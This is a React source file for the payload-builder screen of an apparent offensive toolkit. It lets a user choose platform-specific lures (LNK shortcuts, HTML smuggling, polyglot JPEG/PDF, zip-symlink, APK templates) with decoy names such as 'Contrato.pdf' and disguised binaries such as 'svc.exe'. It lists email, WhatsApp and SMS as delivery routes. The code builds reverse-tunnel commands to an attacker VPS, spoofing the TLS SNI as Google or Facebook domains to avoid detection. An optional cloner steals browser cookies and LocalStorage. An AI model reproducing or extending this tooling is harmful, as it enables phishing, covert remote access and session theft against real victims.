'use client'

import { useState, useCallback } from 'react'
import {
  Monitor, Terminal, Smartphone, Download, RefreshCw, 
  ShieldCheck, ShieldAlert, ShieldMinus, Play, Send,
  FileText, FileImage, FileArchive, Globe, Copy, Check
} from 'lucide-react'
import { useTranslation } from '@/lib/i18n'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Switch } from '@/components/ui/switch'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'

type Platform = 'windows' | 'linux' | 'android'
type PayloadType = 'lnk' | 'desktop' | 'html-smuggling' | 'html-sw' | 'html-captive' | 'html-xss' | 'polyglot-jpeg' | 'polyglot-pdf' | 'zip-symlink' | 'apk-template'

interface PayloadConfig {
  platform: Platform
  payloadType: PayloadType
  vpsHost: string
  vpsPort: string
  technique: string
  sni: string
  useTLS: boolean
  binaryName: string
  outputName: string
  socksPort: string
  includeCloner: boolean
}

interface GoldenRules {
  tlsAvailable: boolean
  sniSpoofable: boolean
  jitterConfigurable: boolean
  usesPort443: boolean
  notMixedProtocol: boolean
}

const TECHNIQUES = [
  { id: 'wstunnel', name: 'wstunnel (WSS)', tls: true, sni: true },
  { id: 'chisel', name: 'chisel (HTTPS)', tls: true, sni: false },
  { id: 'autossh', name: 'autossh (SSH)', tls: false, sni: false },
  { id: 'frp', name: 'FRP (TCP/TLS)', tls: true, sni: false },
]

const SNI_PRESETS = [
  { value: 'google.com', label: 'Google' },
  { value: 'graph.instagram.com', label: 'Instagram' },
  { value: 'graph.facebook.com', label: 'Facebook' },
  { value: 'api.twitter.com', label: 'Twitter/X' },
  { value: 'login.live.com', label: 'Microsoft' },
  { value: 'cloudflare.com', label: 'Cloudflare' },
]

const PLATFORM_PAYLOADS: Record<Platform, PayloadType[]> = {
  windows: ['lnk', 'html-smuggling', 'html-sw', 'html-captive', 'html-xss'],
  linux: ['desktop', 'polyglot-pdf', 'zip-symlink', 'html-sw', 'html-xss'],
  android: ['polyglot-jpeg', 'html-smuggling', 'html-sw', 'html-captive', 'html-xss', 'apk-template'],
}

const PLATFORM_DELIVERY: Record<Platform, string[]> = {
  windows: ['email', 'whatsapp', 'telegram'],
  linux: ['email', 'telegram'],
  android: ['sms', 'whatsapp', 'telegram'],
}

function computeGoldenRules(config: PayloadConfig): GoldenRules {
  const tech = TECHNIQUES.find(t => t.id === config.technique) || TECHNIQUES[0]
  return {
    tlsAvailable: tech.tls || config.useTLS,
    sniSpoofable: tech.sni || (config.sni.length > 0 && config.useTLS),
    jitterConfigurable: config.technique === 'autossh',
    usesPort443: config.vpsPort === '443',
    notMixedProtocol: config.technique !== 'proxyjump',
  }
}

function goldenScore(rules: GoldenRules): number {
  return [rules.tlsAvailable, rules.sniSpoofable, rules.jitterConfigurable, rules.usesPort443, rules.notMixedProtocol].filter(Boolean).length
}

function GoldenIndicator({ rules }: { rules: GoldenRules }) {
  const score = goldenScore(rules)
  const Icon = score >= 5 ? ShieldCheck : score >= 3 ? ShieldMinus : ShieldAlert
  const color = score >= 5 ? 'text-emerald-500' : score >= 3 ? 'text-amber-500' : 'text-red-500'
  return (
    <Badge variant="outline" className={`gap-1 ${color}`}>
      <Icon className="size-3" />
      <span>{score}/5</span>
    </Badge>
  )
}

function buildCommandPreview(config: PayloadConfig): string {
  const { technique, vpsHost, vpsPort, sni, useTLS, binaryName, socksPort } = config
  switch (technique) {
    case 'wstunnel':
      return useTLS
        ? `${binaryName} client --tls-sni-override ${sni || 'google.com'} -L 2222:localhost:22 -L ${socksPort || '1080'}:localhost:1080 wss://${vpsHost}:${vpsPort || '443'}`
        : `${binaryName} client -L 2222:localhost:22 -L ${socksPort || '1080'}:localhost:1080 ws://${vpsHost}:${vpsPort || '80'}`
    case 'chisel':
      return useTLS
        ? `${binaryName} client --tls-skip-verify https://${vpsHost}:${vpsPort || '443'} R:2222:localhost:22 R:${socksPort || '1080'}:localhost:1080`
        : `${binaryName} client http://${vpsHost}:${vpsPort || '80'} R:2222:localhost:22 R:${socksPort || '1080'}:localhost:1080`
    case 'autossh':
      return `autossh -M 0 -o StrictHostKeyChecking=no -R 2222:localhost:22 -R ${socksPort || '1080'}:localhost:1080 ${vpsHost} -p ${vpsPort || '22'}`
    case 'frp':
      return `${binaryName} -c <config> (tls: ${useTLS ? 'on' : 'off'})`
    default:
      return `${binaryName} client wss://${vpsHost}:${vpsPort || '443'}`
  }
}

export function PayloadGenerator() {
  const { t } = useTranslation()
  
  const [config, setConfig] = useState<PayloadConfig>({
    platform: 'windows', payloadType: 'lnk',
    vpsHost: '', vpsPort: '443', technique: 'wstunnel',
    sni: 'google.com', useTLS: true, binaryName: 'svc.exe',
    outputName: 'Contrato.pdf', socksPort: '1080',
    includeCloner: false,
  })
  const [generating, setGenerating] = useState(false)
  const [generated, setGenerated] = useState<string | null>(null)
  const [downloadUrl, setDownloadUrl] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)

  const update = useCallback((k: keyof PayloadConfig, v: string | boolean) => {
    setConfig(prev => {
      const next = { ...prev, [k]: v }
      if (k === 'platform') {
        const newPlatform = v as Platform
        const types = PLATFORM_PAYLOADS[newPlatform]
        next.payloadType = types[0]
        next.binaryName = newPlatform === 'windows' ? 'svc.exe' : newPlatform === 'android' ? '.jun24' : '.crond'
        next.outputName = newPlatform === 'windows' ? 'Contrato.pdf' : newPlatform === 'android' ? 'vacaciones.jpg' : 'informe_2025.pdf'
      }
      return next
    })
    setGenerated(null)
    setDownloadUrl(null)
  }, [])

  const generate = useCallback(async () => {
    setGenerating(true)
    try {
      const resp = await fetch('/api/payloads/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config),
      })
      if (!resp.ok) throw new Error(await resp.text())
      const blob = await resp.blob()
      const url = URL.createObjectURL(blob)
      setDownloadUrl(url)
      setGenerated('OK')
    } catch (e) {
      setGenerated('ERROR')
    }
    setGenerating(false)
  }, [config])

  const rules = computeGoldenRules(config)
  const score = goldenScore(rules)
  const cmd = buildCommandPreview(config)

  return (
    <div className="space-y-6 p-4">
      <div>
        <h2 className="text-xl font-bold flex items-center gap-2">
          <Send className="size-5" />
          {t('payload.title')}
        </h2>
        <p className="text-sm text-muted-foreground">{t('payload.description')}</p>
      </div>

      {/* Golden Rules for payload */}
      <div className="flex items-center gap-4 p-3 rounded-lg bg-muted">
        <GoldenIndicator rules={rules} />
        <div className="grid grid-cols-2 md:grid-cols-5 gap-1.5 text-xs text-muted-foreground flex-1">
          <span className={rules.tlsAvailable ? 'text-emerald-600' : 'text-red-500'}>
            {rules.tlsAvailable ? '✓' : '✗'} TLS
          </span>
          <span className={rules.sniSpoofable ? 'text-emerald-600' : 'text-red-500'}>
            {rules.sniSpoofable ? '✓' : '✗'} SNI Spoof
          </span>
          <span className={rules.jitterConfigurable ? 'text-emerald-600' : 'text-red-500'}>
            {rules.jitterConfigurable ? '✓' : '✗'} Jitter
          </span>
          <span className={rules.usesPort443 ? 'text-emerald-600' : 'text-red-500'}>
            {rules.usesPort443 ? '✓' : '✗'} Port 443
          </span>
          <span className={rules.notMixedProtocol ? 'text-emerald-600' : 'text-red-500'}>
            {rules.notMixedProtocol ? '✓' : '✗'} Single Proto
          </span>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Platform + Payload Type Selection */}
        <Card>
          <CardHeader>
            <CardTitle className="text-base">{t('payload.platform')}</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-3 gap-2">
              {([
                { id: 'windows', icon: Monitor, label: t('payload.platform.windows'), desc: t('payload.platform.windowsDesc') },
                { id: 'linux', icon: Terminal, label: t('payload.platform.linux'), desc: t('payload.platform.linuxDesc') },
                { id: 'android', icon: Smartphone, label: t('payload.platform.android'), desc: t('payload.platform.androidDesc') },
              ] as const).map(p => (
                <button
                  key={p.id}
                  onClick={() => update('platform', p.id)}
                  className={`flex flex-col items-center gap-1.5 p-3 rounded-lg border-2 transition-all ${
                    config.platform === p.id ? 'border-primary bg-primary/5' : 'border-border hover:border-primary/30'
                  }`}
                >
                  <p.icon className="size-6" />
                  <span className="text-sm font-medium">{p.label}</span>
                  <span className="text-[10px] text-muted-foreground text-center">{p.desc}</span>
                </button>
              ))}
            </div>

            <Label>{t('payload.type')}</Label>
            <div className="grid grid-cols-2 gap-1.5">
              {PLATFORM_PAYLOADS[config.platform].map(pt => (
                <button
                  key={pt}
                  onClick={() => update('payloadType', pt)}
                  className={`flex items-center gap-2 p-2 rounded-lg border text-sm transition-all ${
                    config.payloadType === pt ? 'border-primary bg-primary/5 font-medium' : 'border-border hover:border-primary/30'
                  }`}
                >
                  {pt.includes('polyglot') || pt.includes('html') ? <FileImage className="size-4" /> :
                   pt === 'apk-template' ? <Smartphone className="size-4" /> :
                   pt === 'zip-symlink' ? <FileArchive className="size-4" /> :
                   <FileText className="size-4" />}
                  {t(`payload.type.${pt}`)}
                </button>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Tunnel Configuration */}
        <Card>
          <CardHeader>
            <CardTitle className="text-base">{t('payload.config')}</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label>{t('payload.vpsHost')}</Label>
                <Input value={config.vpsHost} onChange={e => update('vpsHost', e.target.value)} placeholder="51.222.84.105" />
              </div>
              <div>
                <Label>{t('payload.vpsPort')}</Label>
                <Input value={config.vpsPort} onChange={e => update('vpsPort', e.target.value)} placeholder="443" />
              </div>
            </div>

            <div>
              <Label>{t('payload.technique')}</Label>
              <Select value={config.technique} onValueChange={v => update('technique', v)}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {TECHNIQUES.map(tech => (
                    <SelectItem key={tech.id} value={tech.id}>{tech.name}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label>{t('payload.binaryName')}</Label>
                <Input value={config.binaryName} onChange={e => update('binaryName', e.target.value)} />
              </div>
              <div>
                <Label>{t('payload.outputName')}</Label>
                <Input value={config.outputName} onChange={e => update('outputName', e.target.value)} />
              </div>
            </div>

            <div className="flex items-center justify-between rounded-lg border p-3">
              <div>
                <Label className="text-sm">{t('payload.useTLS')}</Label>
                <p className="text-xs text-muted-foreground">TLS + SNI = tráfico indetectable</p>
              </div>
              <Switch checked={config.useTLS} onCheckedChange={v => update('useTLS', v)} />
            </div>

            {['polyglot-jpeg','polyglot-pdf','desktop','lnk','zip-symlink'].includes(config.payloadType) && (
              <div className="flex items-center justify-between rounded-lg border p-3">
                <div>
                  <Label className="text-sm">Browser Profile Cloner</Label>
                  <p className="text-xs text-muted-foreground">Extrae cookies + LocalStorage y las envía a la VPS</p>
                </div>
                <Switch checked={config.includeCloner} onCheckedChange={v => update('includeCloner', v)} />
              </div>
            )}

            {config.useTLS && (
              <div>
                <Label>{t('payload.sni')}</Label>
                <div className="flex gap-1.5 flex-wrap mb-2">
                  {SNI_PRESETS.map(sp => (
                    <button
                      key={sp.value}
                      onClick={() => update('sni', sp.value)}
                      className={`px-2 py-0.5 rounded text-xs border transition-all ${
                        config.sni === sp.value ? 'border-primary bg-primary/10 text-primary' : 'border-border hover:border-primary/30'
                      }`}
                    >
                      {sp.label}
                    </button>
                  ))}
                </div>
                <Input value={config.sni} onChange={e => update('sni', e.target.value)} className="text-xs" />
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Command Preview */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-base">{t('payload.commandPreview')}</CardTitle>
        </CardHeader>
        <CardContent>
          <pre className="bg-black text-green-400 p-3 rounded-lg text-xs overflow-x-auto font-mono whitespace-pre-wrap break-all">
            {cmd}
          </pre>
        </CardContent>
      </Card>

      {/* Delivery Vector */}
      <div>
        <Label className="text-sm mb-2 block">{t('payload.deliveryVector')}</Label>
        <div className="flex gap-1.5 flex-wrap">
          {PLATFORM_DELIVERY[config.platform].map(dv => (
            <Badge key={dv} variant="secondary" className="gap-1">
              {dv === 'email' && <Send className="size-3" />}
              {dv === 'whatsapp' && <Smartphone className="size-3" />}
              {dv === 'telegram' && <Send className="size-3" />}
              {dv === 'sms' && <Smartphone className="size-3" />}
              {t(`payload.delivery.${dv}`)}
            </Badge>
          ))}
        </div>
      </div>

      <Separator />

      {/* Generate + Download */}
      <div className="flex items-center gap-3">
        <Button onClick={generate} disabled={generating || !config.vpsHost} className="gap-2">
          {generating ? <RefreshCw className="size-4 animate-spin" /> : <Play className="size-4" />}
          {config.vpsHost ? t('payload.generate') : 'Configura VPS primero'}
        </Button>

        {downloadUrl && (
          <>
            <Button variant="outline" asChild className="gap-2">
              <a href={downloadUrl} download={config.outputName || 'payload'}>
                <Download className="size-4" />
                {t('payload.download')}
              </a>
            </Button>
            <Button
              variant="ghost"
              size="sm"
              onClick={() => { navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(() => setCopied(false), 2000) }}
            >
              {copied ? <Check className="size-4 text-emerald-500" /> : <Copy className="size-4" />}
            </Button>
          </>
        )}
      </div>

      {/* Deployment Steps */}
      <Card className="bg-muted/50">
        <CardHeader className="pb-2">
          <CardTitle className="text-sm">{t('payload.deploymentSteps')}</CardTitle>
        </CardHeader>
        <CardContent>
          <ol className="text-xs text-muted-foreground space-y-1 list-decimal ml-4">
            <li>{t('payload.step1')}</li>
            <li>{t('payload.step2')}</li>
            <li>{t('payload.step3')}</li>
            <li>{t('payload.step4')}</li>
            <li>{t('payload.step5')}</li>
          </ol>
        </CardContent>
      </Card>

      {generated === 'ERROR' && (
        <div className="p-3 rounded-lg bg-red-500/10 text-red-600 text-sm">
          {t('payload.error')}
        </div>
      )}
    </div>
  )
}
